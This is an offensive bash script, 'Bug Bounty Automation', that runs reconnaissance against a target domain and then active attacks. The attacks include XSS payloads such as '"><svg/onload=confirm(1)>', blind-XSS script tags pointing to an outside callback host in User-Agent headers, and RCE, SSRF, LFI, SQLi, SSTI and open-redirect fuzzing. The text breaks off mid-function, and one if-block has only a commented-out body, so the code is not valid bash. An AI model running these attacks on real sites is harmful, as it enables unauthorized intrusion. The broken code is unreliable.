#!/bin/bash
#Coded by @lemosnlmb

#Colors
RED='\033[1;31m'
CYAN='\033[1;36m'
GREEN='\033[1;32m'
PURPLE='\033[1;35m'
YELLOW='\033[1;33m'
NC='\033[0m'


#Banner
printf "${GREEN}\n"
printf " __ )  __ )    \ \n"
printf " __ \  __ \   _ \ \n"
printf " |   | |   | ___ \ \n"
printf "____/ ____/_/    _\  ${PURPLE}\n"
printf "       by @lemosnlmb\n"
echo -e "${YELLOW}"
printf "[BBA] == Bug Bounty Automation"
echo -e "${NC}"


#Usage
printusage(){
    echo -e "${CYAN}"
    echo -e "Required Flags: ${NC}"
    echo -e "   -d, --domain                Add your target domain                       -d domain.tld"
    echo -e "   -o, --output                Write to output folder                       -o results"
    echo -e "${CYAN}"
    echo -e "Optional Flags: ${NC}"
    echo -e "   -s, --server                Add your server for OOB Testing              -s https://yourserver.tld"
    echo -e "   -b, --blind                 Add your Blind XSS server                    -b blind.xss.ht"
    echo -e "   -i, --include               Include subdomains list                      -i /home/subs.txt"
    echo -e "   -x, --exclude               Exclude Out-of-Scope domains list            -x /home/oosd.txt"
    echo -e "   -w, --wordlist              Add wordlist for subdomain Brute-Force       -w /home/wordlist.txt"
    echo -e "${CYAN}"
    echo -e "Example Usage: ${NC}"
    echo -e "   ./bba -d domain.tld -s https://yourserver.tld -b blind.xss.ht -i /home/subs.txt -x /home/oosd.txt -w /home/wordlist.txt -o results"
    exit
}


#Argument Flags
while [ -n "$1" ]; do
    case $1 in
        -d|-domain|--domain)
            domain=$2
            shift ;;

        -s|-server|--server)
            server=$2
            shift ;;

        -b|-blind|--blind)
            blindxss=$2
            shift ;;

        -i|-include|--include)
            include=$2
            shift ;;

        -x|-exclude|--exclude)
            exclude=$2
            shift ;;

        -w|-wordlist|--wordlist)
            wordlist=$2
            shift ;;

        -o|-output|--output)
            output=$2
            shift ;;

        -h|-help|--help)
            printusage
            shift ;;

        *) echo -e "${RED}"
            echo -e "Invalid Flag: $1"
            printusage
            exit
            shift ;;
    esac
    shift
done


if [ ! -n "$domain" ]; then
    echo -e "${RED}"
    echo -e "Target domain not supplied ${CYAN}"
    printusage
    exit
fi


if [ ! -n "$output" ]; then
    echo -e "${RED}"
    echo -e "Output destination not supplied ${CYAN}"
    printusage
    exit
fi


#Checking Internet Connection
wget -q --spider https://google.com
if [ $? -ne 0 ]; then
    echo -e "${RED}"
    echo -e "You must connect to internet before running this tool!"
    exit
fi


#Creating Directories
mkdir -p .tmp $output/sources $output/Recon/{api,security_headers,flyover,exposed,nuclei,fuzzing,urls,gf,wordlist,Parameters,JavaScript,vulns,IPs,osint,cloud}


echo ""
echo -e "${PURPLE}Updating Nuclei and it's templates${NC}"
nuclei -update > /dev/null 2>&1 ; nuclei -update-templates > /dev/null 2>&1


echo ""
echo -e "${PURPLE}Generating DNS Resolvers${NC}"
wget -q https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O .tmp/resolvers.txt
wget -q https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt -O .tmp/resolvers-trusted.txt


start(){
DAY="$(date +%d/%m/%Y)"
TIME="$(date +%T)"
WEEKDAY="$(date +%A)"
echo -e "${CYAN}"
echo -e "Recon started on $domain on ${WEEKDAY}, ${DAY} at ${TIME}"
echo -e "[BBA] - Recon started on $domain on ${WEEKDAY}, ${DAY} at ${TIME}" | notify -silent > /dev/null 2> /dev/null
start=$(date +%s)
}


domain_info(){
    #Finding company trade name used on certificate
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Searching for company trade name${NC}"
    keyword=${domain%%.*}
    curl -s https://crt.sh\?O\=\%.$keyword\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew $output/Recon/osint/trade_name.txt

    #Whois Lookup
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Whois Lookup - Searching Domain Info (Domain name details, Contact details of Domain owner, Domain name servers, netRange, Domain dates, Expiry records, Records last updated...)${NC}"
    whois $domain | grep 'Domain\|Registry\|Registrar\|Updated\|Creation\|Registrant\|Name Server\|DNSSEC:\|Status\|Whois Server\|Admin\|Tech' | grep -v 'the Data in VeriSign Global Registry' | tee $output/Recon/osint/whois.txt

    #Nslookup
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Nslookup - Searching DNS Queries${NC}"
    nslookup $domain | tee $output/Recon/osint/nslookup.txt
}


dorking(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Generating GitHub and Google Dorking links ${NC}"
    open https://dorks.faisalahmed.me/
    open https://vsec7.github.io/

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running GitHub Dorking${NC}"
    python3 ~/bb/GitDorker/GitDorker.py -tf ~/bb/GitDorker/tf/TOKENSFILE -q "$domain" -p -ri -d ~/bb/GitDorker/Dorks/medium_dorks.txt | grep "\[+\]" | grep "git" | tee $output/Recon/osint/gitdorker.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running Google Dorking${NC}"
    ./bb/GooFuzz/GooFuzz -t $domain -e bb/GooFuzz/extensions.txt | tee $output/Recon/osint/google-dorks.txt
}


sub_passive(){
    #Subdomain Enumeration
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Enumerating subdomains of $domain - Passive Enumeration${NC}"
    echo ""

    echo -e "${PURPLE}Running amass${NC}"
    echo ""
    amass enum -passive -d $domain -nocolor -o $output/sources/amass.txt
    echo ""
}


sub_active(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Enumerating subdomains of $domain - Active Enumeration${NC}"
    echo ""
    echo -e "${PURPLE}Running gobuster (1/3)${NC}"
    if [ -n "$wordlist" ]; then
	gobuster dns -d $domain -w $wordlist -o .tmp/gobuster.txt | grep "Found: "
    else
        wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -O .tmp/subdomains-top1million-5000.txt
	gobuster dns -d $domain -w .tmp/subdomains-top1million-5000.txt -o .tmp/gobuster.txt | grep "Found: "
    fi

    echo -e "${PURPLE}Running dnsx (2/3)${NC}"
    cat .tmp/gobuster.txt | awk '{print $2}' | anew -q $output/sources/gobuster.txt
    echo $domain | dnsx -retry 3 -silent -r .tmp/resolvers-trusted.txt | anew -q $output/sources/dnsx.txt

    echo -e "${PURPLE}Running tlsx (3/3)${NC}"
    cat $output/sources/*.txt | tlsx -san -cn -silent -ro | anew $output/sources/tlsx.txt
}


sub_check(){
    if [ -f "$exclude" ]; then
        cat $output/sources/*.txt | grep "$domain" | grep -vf $exclude | sort -u | sed '/@\|<BR>\|\_\|*/d' | anew -q $output/sources/all.txt
    else
        cat $output/sources/*.txt | grep "$domain" | sort -u | sed '/@\|<BR>\|\_\|*/d' | anew -q $output/sources/all.txt
    fi


    if [ -f "$include" ]; then
        cat $include | anew -q $output/sources/all.txt
    fi
}


http_probe(){
    #HTTP Probing subdomains
    if (( $(wc -l $output/sources/all.txt | awk '{print $1}') > 0)) && (( $(wc -l $output/sources/all.txt | awk '{print $1}') <= 50)) ; then
       echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} HTTP Probing subdomains (Extra Large) - Ports: 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3001,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,12443,16080,18091,18092,20720,28017${NC}"
       cat $output/sources/all.txt | httpx -rl 30 -silent -p 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3001,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,12443,16080,18091,18092,20720,28017 -t 100 -o $output/Recon/httpx.txt
    fi

    if (( $(wc -l $output/sources/all.txt | awk '{print $1}') > 50)) && (( $(wc -l $output/sources/all.txt | awk '{print $1}') <= 300)) ; then
       echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} HTTP Probing subdomains (Large) - Ports: 80,81,443,591,2082,2087,2095,2096,3000,3001,8000,8001,8008,8080,8083,8443,8834,8888${NC}"
       cat $output/sources/all.txt | httpx -rl 30 -silent -p 80,81,443,591,2082,2087,2095,2096,3000,3001,8000,8001,8008,8080,8083,8443,8834,8888 -t 100 -o $output/Recon/httpx.txt
    fi

    if (( $(wc -l $output/sources/all.txt | awk '{print $1}') > 300)) && (( $(wc -l $output/sources/all.txt | awk '{print $1}') <= 600)) ; then
       echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} HTTP Probing subdomains (Medium) - Ports: 80,443,3000,8000,8080,8443${NC}"
       cat $output/sources/all.txt | httpx -rl 30 -silent -p 80,443,3001,8000,8080,8443 -t 100 -o $output/Recon/httpx.txt
    fi

    if (( $(wc -l $output/sources/all.txt | awk '{print $1}') > 600)) ; then
       echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} HTTP Probing subdomains (Small) - Ports: 80,443${NC}"
       cat $output/sources/all.txt | httpx -rl 30 -silent -p 80,443 -t 100 -o $output/Recon/httpx.txt
    fi
}


flyover(){
    #Subdomain flyover (Screenshoting subdomains & Technology discovery)
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running Subdomain flyover${NC}"
    gowitness file -f $output/Recon/httpx.txt -P $output/Recon/flyover
    gowitness report export -f $output/Recon/flyover/flyover.zip -P $output/Recon/flyover
    unzip -q $output/Recon/flyover/flyover.zip -d $output/Recon/flyover/
    rm -rf $output/Recon/flyover/*.png $output/Recon/flyover/flyover.zip gowitness.sqlite3 ; mv $output/Recon/flyover/gowitness/* $output/Recon/flyover/ ; rm -rf $output/Recon/flyover/gowitness
    open $output/Recon/flyover/index.html
}


takeover(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Looking for Possible Subdomain and DNS Takeover with Nuclei${NC}"
    cat $output/Recon/httpx.txt | nuclei -silent -t ~/nuclei-templates/takeovers/ -o $output/Recon/takeover.txt | notify -silent
}


waf_checks(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running WAF Identification${NC}"
    python3.9 /usr/bin/wafw00f -i ~/$output/Recon/httpx.txt -o ~/.tmp/wafs.txt > /dev/null
    cat ~/.tmp/wafs.txt | sed -e 's/^[ \t]*//' -e 's/ \+ /\t/g' -e '/(None)/d' | tr -s "\t" ";" > ~/$output/Recon/wafs.txt

    if (( $(wc -l ~/$output/Recon/wafs.txt | awk '{print $1}') > 0)); then
	echo ""
        echo -e "${CYAN}Website's protected by WAF:${NC}"
        cat $output/Recon/wafs.txt
    else
        echo -e "${RED}No Website is protected by WAF"
        echo -e "${NC}"
    fi


    if (( $(wc -l $output/Recon/wafs.txt | awk '{print $1}') > 0)); then
            notify -silent -data $output/Recon/wafs.txt -bulk -silent > /dev/null 2> /dev/null
    fi
}


security_header_check(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Checking security headers on subdomains${NC}"
    cat $output/Recon/httpx.txt | while read sub
    do
        sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
        python3 bb/shcheck.py $sub -d > $output/Recon/security_headers/$sub_out.txt
    done
}


exposures(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for exposed services/files/folders with ChopChop${NC}"
    cd bb/ChopChop ; ./gochopchop scan -u ~/$output/Recon/httpx.txt | tee ~/$output/Recon/exposed/chopchop.txt ; cd ~/

    if (( $(wc -l $output/Recon/exposed/chopchop.txt | awk '{print $1}') > 0)); then
           notify -silent -data $output/Recon/exposed/chopchop.txt -bulk -silent > /dev/null 2> /dev/null
    fi
}


admin_login_finder(){
    #Downloading wordlist
    wget -q https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/admin-panels.txt -O .tmp/admin-finder.txt

    #Appending they keyword "FUZZ" at the end of all subdomains
    sed -e '/\.mtt\.corp$/!s/$/\/FUZZ/' $output/Recon/httpx.txt > .tmp/httpx-fuzz.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Searching for Admin login pages${NC}"
    interlace -tL .tmp/httpx-fuzz.txt -c "ffuf -r -v -w .tmp/admin-finder.txt -u \"_target_\" -mr \"(?i)password\" " 2>/dev/null | grep "URL" | sed 's/| URL | //' | anew $output/Recon/admin-login-pages.txt

    if (( $(wc -l $output/Recon/admin-login-pages.txt | awk '{print $1}') > 0)); then
	    notify -silent -data $output/Recon/admin-login-pages.txt -bulk -silent > /dev/null 2> /dev/null
    fi
}


nuclei_scan(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Starting Nuclei Scan${NC}"
    echo ""
    echo -e "${PURPLE}Running Nuclei Scan - Low (1/4)${NC}"
    nuclei -l $output/Recon/httpx.txt -s low -silent -o $output/Recon/nuclei/low.txt -rl 30 -c 10 -et ~/nuclei-templates/takeovers/ | notify -silent
    echo ""
    echo -e "${PURPLE}Running Nuclei Scan - Medium (2/4)${NC}"
    nuclei -l $output/Recon/httpx.txt -s medium -silent -o $output/Recon/nuclei/medium.txt -rl 30 -c 10 -et ~/nuclei-templates/takeovers/ | notify -silent
    echo ""
    echo -e "${PURPLE}Running Nuclei Scan - High (2/4)${NC}"
    nuclei -l $output/Recon/httpx.txt -s high -silent -o $output/Recon/nuclei/high.txt -rl 30 -c 10 -et ~/nuclei-templates/takeovers/ | notify -silent
    echo ""
    echo -e "${PURPLE}Running Nuclei Scan - Critical (4/4)${NC}"
    nuclei -l $output/Recon/httpx.txt -s critical -silent -o $output/Recon/nuclei/critical.txt -rl 30 -c 10 -et ~/nuclei-templates/takeovers/ | notify -silent
}


dir_fuzz(){
    #Content Discovery/Directory Brute-Force
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running Directory Brute-Force on interesting subdomains${NC}"
    wget -q https://raw.githubusercontent.com/maurosoria/dirsearch/master/db/dicc.txt -O .tmp/dicc.txt
    python3.9 /usr/bin/interlace -tL ~/$output/Recon/httpx.txt -c "ffuf -w .tmp/dicc.txt -ac -u _target_/FUZZ -of json -o _output_/_cleantarget_.json" -o ~/ 2>/dev/null
    for sub in $(cat $output/Recon/httpx.txt); do
        sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
        cat ~/${sub_out}.json | jq -r 'try .results[] | "\(.status) \(.length) \(.url)"' | sort -u | anew -q $output/Recon/fuzzing/${sub_out}.txt
        rm -rf ~/${sub_out}.json
    done
    cat $output/Recon/fuzzing/*.txt > $output/Recon/fuzzing/fuzzing_full.txt
}


find_urls(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Extracting URL's${NC}"
    echo ""

    echo -e "${PURPLE}Running gau (1/3)${NC}"
    echo ""
    gau --subs $domain > $output/Recon/urls/gau.txt
    echo ""

    echo -e "${PURPLE}Running hakrawler (2/3)${NC}"
    echo ""
    cat $output/Recon/httpx.txt | hakrawler -u -d 3 > $output/Recon/urls/hakrawler.txt
    echo ""

    echo -e "${PURPLE}Appending all URL's together and validating them (3/3)${NC}"
    echo ""
    cat $output/Recon/urls/*.txt | grep -a $domain | sort -u > $output/Recon/urls/all_urls.txt
    ffuf -w $output/Recon/urls/all_urls.txt -u FUZZ -s -r -mc 200,201,202,204,301,302,307,401,403,405 > $output/Recon/urls/valid_urls.txt
    echo ""
}


gfp(){
    #Grepping for sus endpoints with gf Patterns | Patterns: https://github.com/lemosnlmb/gf-patterns
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Grepping for suspicious endpoints with gf Patterns${NC}"
    gf xss $output/Recon/urls/valid_urls.txt > $output/Recon/gf/xss.txt
    gf sqli $output/Recon/urls/valid_urls.txt > $output/Recon/gf/sqli.txt
    gf ssrf $output/Recon/urls/valid_urls.txt > $output/Recon/gf/ssrf.txt
    gf ssti $output/Recon/urls/valid_urls.txt > $output/Recon/gf/ssti.txt
    gf rce $output/Recon/urls/valid_urls.txt > $output/Recon/gf/rce.txt
    gf lfi $output/Recon/urls/valid_urls.txt > $output/Recon/gf/lfi.txt
    gf idor $output/Recon/urls/valid_urls.txt > $output/Recon/gf/idor.txt
    gf redirect $output/Recon/urls/valid_urls.txt > $output/Recon/gf/redirect.txt
    gf img-traversal $output/Recon/urls/valid_urls.txt > $output/Recon/gf/img-traversal.txt
    gf interestingExt $output/Recon/urls/valid_urls.txt > $output/Recon/gf/interestingExt.txt
    gf auth $output/Recon/urls/valid_urls.txt > $output/Recon/gf/auth.txt
    gf interestingSubs $output/Recon/httpx.txt > $output/Recon/gf/interestingSubs.txt
    gf debug_logic $output/Recon/httpx.txt > $output/Recon/gf/debug_logic.txt
}


api(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Enumerating API endpoints${NC}"
    cat $output/Recon/httpx.txt | grep api > $output/Recon/api/api.txt
    cat $output/Recon/httpx.txt | grep dev > $output/Recon/api/dev.txt
    cat $output/Recon/httpx.txt | grep prod > $output/Recon/api/prod.txt
    cat $output/Recon/httpx.txt | grep infra > $output/Recon/api/infra.txt
    cat $output/Recon/httpx.txt | grep staging > $output/Recon/api/staging.txt
    cat $output/Recon/httpx.txt | grep app > $output/Recon/api/app.txt
    cat $output/Recon/api/*.txt | anew -q $output/Recon/api/api_dev_all.txt

    #Downloading API wordlist
    wget -q https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2021_10_28.txt -O .tmp/httparchive_apiroutes_2021_10_28.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running dirsearch on API endpoints${NC}"
    dirsearch -l ~/$output/Recon/api/api_dev_all.txt -f -r -b -i 200 -e json -t 9000 -w .tmp/httparchive_apiroutes_2021_10_28.txt -o $output/Recon/api/dirsearch.txt
}


find_params(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Finding Parameters${NC}"

    #Grepping for Parameters from extacted URL's
    cat $output/Recon/urls/valid_urls.txt | grep "=" | anew -q $output/Recon/Parameters/all_parameters.txt

    #Searching for Hidden Parameter with Arjun
    if (( $(wc -l $output/Recon/httpx.txt | awk '{print $1}') <= 20 )); then
    	#arjun -i $output/Recon/httpx.txt -oT $output/Recon/Parameters/arjun.txt
    fi

    if [[ $(wget -S --spider  https://$domain  2>&1 | grep 'HTTP/1.1 200 OK') ]] && (( $(wc -l $output/Recon/httpx.txt | awk '{print $1}') > 20 )); then
	arjun -u http://$domain -oT $output/Recon/Parameters/arjun.txt
    fi

    if [[ $(wget -S --spider  http://$domain  2>&1 | grep 'HTTP/1.1 200 OK') ]] && (( $(wc -l $output/Recon/httpx.txt | awk '{print $1}') > 20 )); then
        arjun -u https://$domain -oT $output/Recon/Parameters/arjun.txt
    fi

    #Appending all Parameters together and removing uninteresting/duplicate content
    cat $output/Recon/Parameters/*.txt | uro | anew -q $output/Recon/Parameters/all_parameters.txt
}


wordlist_gen(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Generating Wordlists of Parameters and Values${NC}"
    cat $output/Recon/urls/valid_urls.txt | unfurl -u keys > $output/Recon/wordlist/params.txt
    cat $output/Recon/urls/valid_urls.txt | unfurl -u values > $output/Recon/wordlist/values.txt
    cat $output/Recon/urls/valid_urls.txt | tr "[:punct:]" "\n" | anew -q $output/Recon/wordlist/dict_words.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Generating wordlists of endpoints via robots.txt files${NC}"
    cat $output/Recon/httpx.txt | roboxtractor -m 1 -wb 2>/dev/null | anew -q $output/Recon/wordlist/robots_wordlist.txt

    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Generating Password wordlist${NC}"
    python3 bb/pydictor/pydictor.py -extend vulnweb --leet 0 1 2 11 21 -o $output/Recon/wordlist/password_dict.txt >/dev/null 2>/dev/null
}


js_recon(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Running JavaScript Recon${NC}"
    echo ""

    echo -e "${PURPLE}Gathering JavaScipt links (1/3)${NC}"
    echo ""
    getJS --complete --input $output/Recon/httpx.txt | grep $domain | anew -q $output/Recon/JavaScript/getjs.txt
    subjs -i $output/Recon/httpx.txt -ua "Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -c 40 | grep $domain | anew -q $output/Recon/JavaScript/subjs.txt
    cat $output/Recon/urls/valid_urls.txt | grep -P "\w+\.js(\?|$)" | anew -q $output/Recon/JavaScript/js_urls.txt

    #Appending all js links together & validating links with nilo
    cat $output/Recon/JavaScript/*.txt | grep $domain | sed 's/\.js.*/.js/' | sort -u | nilo | anew -q $output/Recon/JavaScript/js_links.txt
    echo ""

    echo -e "${PURPLE}Scanning for Sensitive Data Exposure in JavaScript links (2/3)${NC}"
    echo ""
    nuclei -l $output/Recon/JavaScript/js_links.txt -tags exposure,token -silent -rl 30 -c 10 -o $output/Recon/JavaScript/nuclei.txt | notify -silent
    echo ""

    echo -e "${PURPLE}Gathering endpoints in JavaScript links (3/3)${NC}"
    echo ""
    python3 bb/xnLinkFinder/xnLinkFinder.py -i $output/Recon/JavaScript/js_links.txt -o $output/Recon/JavaScript/js_endpoints.txt &>/dev/null
    echo ""
}


vulns(){
    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for XSS${NC}"
    cat $output/Recon/Parameters/all_parameters.txt | bhedak '"><svg/onload=confirm(1)>' | airixss -p "confirm(1)" | grep -v "Not Vulnerable to XSS" | tee $output/Recon/vulns/kxss.txt

    if [ -n "$blindxss" ]; then
	echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Blind XSS${NC}"
	echo -e "${PURPLE}Fuzzing Headers for Blind XSS on subdomains (1/2)${NC}"
	cd bb/BB-Scripts/xss/blind-xss/ && ./blind-xss.sh ~/$output/Recon/httpx.txt $blindxss ; cd ~/

	echo -e "${PURPLE}Fuzzing User-Agent for Blind XSS on extracted URL's (2/2)${NC}"
        ffuf -w ~/$output/Recon/urls/valid_urls.txt -u FUZZ -H "User-Agent: \"><script src=https://$blindxss></script>" 2 > /dev/null
    fi


    if [ -n "$server" ]; then
        echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Blind RCE{NC}"
	echo -e "${PURPLE}Fuzzing Headers for Blind RCE (1/2)${NC}"
	cd bb/BB-Scripts/rce/blind-rce-headers && ./blind-rce-headers.sh ~/$output/Recon/httpx.txt $server ; cd ~/

        echo -e "${PURPLE}Fuzzing Parameters for Blind RCE (1/2)${NC}"
        cd bb/BB-Scripts/rce/blind-rce-params && ./blind-rce-params.sh ~/$output/Recon/Parameters/all_parameters.txt $server ; cd ~/



	echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Blind SSRF{NC}"
        echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Fuzzing Headers for Blind SSRF (1/2)${NC}"
	cd bb/BB-Scripts/ssrf/blind-ssrf-headers && ./blind-ssrf-headers.sh ~/$output/Recon/httpx.txt $server ; cd ~/

	echo -e "${PURPLE}Fuzzing Parameters for Blind SSRF (2/2)${NC}"
	cd bb/BB-Scripts/ssrf/blind-ssrf-params && ./blind-ssrf-params.sh ~/$output/Recon/Parameters/all_parameters.txt $server ; cd ~/
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for RCE${NC}"
    echo -e "${PURPLE}Fuzzing Headers for RCE (1/2)${NC}"
    cd bb/BB-Scripts/rce/rce-headers && ./rce-headers.sh ~/$output/Recon/httpx.txt | tee ~/$output/Recon/vulns/rce-headers.txt ; cd ~/

    if (( $(wc -l $output/Recon/vulns/rce-headers.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/rce-headers.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "${PURPLE}Fuzzing Parameters for RCE (2/2)${NC}"
    cd bb/BB-Scripts/rce/rce-params && ./rce-params.sh ~/$output/Recon/Parameters/all_parameters.txt | tee ~/$output/Recon/vulns/rce-params.txt ; cd ~/

    if (( $(wc -l $output/Recon/vulns/rce-params.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/rce-params.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for SSRF (AWS Instances)${NC}"
    echo -e "${PURPLE}Fuzzing Headers for SSRF (1/2)${NC}"
    cd bb/BB-Scripts/ssrf/ssrf-headers && ./ssrf-headers.sh ~/$output/Recon/httpx.txt | tee ~/$output/Recon/vulns/ssrf-headers.txt ; cd ~/

    if (( $(wc -l $output/Recon/vulns/ssrf-headers.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/ssrf-headers.txt -bulk -silent > /dev/null 2> /dev/null
    fi

    echo -e "${PURPLE}Fuzzing Parameters for SSRF (2/2)${NC}"
    cd bb/BB-Scripts/ssrf/ssrf-params && ./ssrf-params.sh ~/$output/Recon/Parameters/all_parameters.txt | tee ~/$output/Recon/vulns/ssrf-params.txt ; cd ~/

    if (( $(wc -l $output/Recon/vulns/ssrf-params.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/ssrf-params.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for LFI/Path traversal${NC}"
    cat $output/Recon/gf/lfi.txt $output/Recon/gf/img-traversal.txt | anew -q .tmp/lfi-fuzz.txt
    cd bb/BB-Scripts/lfi/ && ./lfi.sh ~/.tmp/lfi-fuzz.txt | tee ~/$output/Recon/vulns/lfi.txt ; cd ~/

    if (( $(wc -l $output/Recon/vulns/lfi.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/lfi.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for SQL Injection${NC}"
    echo -e "${PURPLE}Fuzzing Headers for Blind SQL Injection (1/2)${NC}"
    nuclei -l $output/Recon/httpx.txt -t nuclei-templates/custom/header-blind-sqli.yaml -silent -o $output/Recon/vulns/sqli-headers.txt | notify -silent

    echo -e "${PURPLE}Fuzzing Parameters for SQL Injection (2/2)${NC}"
    python3 ~/bb/SQLiDetector/sqlidetector.py -f $output/Recon/gf/sqli.txt -o $output/Recon/vulns/sqli-params.txt; cat $output/Recon/vulns/sqli-params.txt | notify -silent -bulk


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for SSTI${NC}"
    nuclei -l $output/Recon/gf/ssti.txt -t nuclei-templates/custom/ssti.yaml -silent -o $output/Recon/vulns/ssti.txt | notify -silent


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Prototype Pollution${NC}"
    ppfuzz -l $output/Recon/httpx.txt -c 30 2>/dev/null | sed -e '1,7d' | tee $output/Recon/vulns/prototype-pollution.txt

    if (( $(wc -l $output/Recon/vulns/prototype-pollution.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/prototype-pollution.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Open Redirect on subdomains${NC}"
    nuclei -l $output/Recon/httpx.txt -t nuclei-templates/vulnerabilities/generic/open-redirect.yaml -o $output/Recon/vulns/open-redirect-dns.txt -silent | notify -silent


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Open Redirect on Parameters${NC}"
    cat $output/Recon/Parameters/all_parameters.txt | bhedak "https://google.com" 2>/dev/null > .tmp/redirect.txt
    cat .tmp/redirect.txt | httpx -title -silent -fr | grep "Google" | while read url; do echo -e "${RED}Vulnerable to Open Redirect${NC}: $url"; done | tee $output/Recon/vulns/open-redirect-params.txt

    if (( $(wc -l $output/Recon/vulns/open-redirect-params.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/open-redirect-params.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for CRLF Injection${NC}"
    crlfuzz -l $output/Recon/httpx.txt -s -o $output/Recon/vulns/crlf.txt

    if (( $(wc -l $output/Recon/vulns/crlf.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/crlf.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for Clickjacking on subdomains${NC}"
    python3 ~/bb/clickjack.py $output/Recon/httpx.txt
    awk '{$1=$1" is vulnerable to clickjacking"}1' ~/Vulnerable.txt > $output/Recon/vulns/clickjack.txt && rm -rf ~/Vulnerable.txt

    if (( $(wc -l $output/Recon/vulns/clickjack.txt | awk '{print $1}') > 0)); then
        notify -silent -data $output/Recon/vulns/clickjack.txt -bulk -silent > /dev/null 2> /dev/null
    fi


    echo -e "\n${CYAN}[${GREEN}+${CYAN}]${GREEN} Scanning for CORS Misconfigurations${NC}"
    cors -i $output/Recon/httpx.txt -t 100 -o $output/Recon/vulns/cors.json

    if (( $(wc -l $output/Recon/vulns/cors.json | awk '{print $1}') > 0)); then
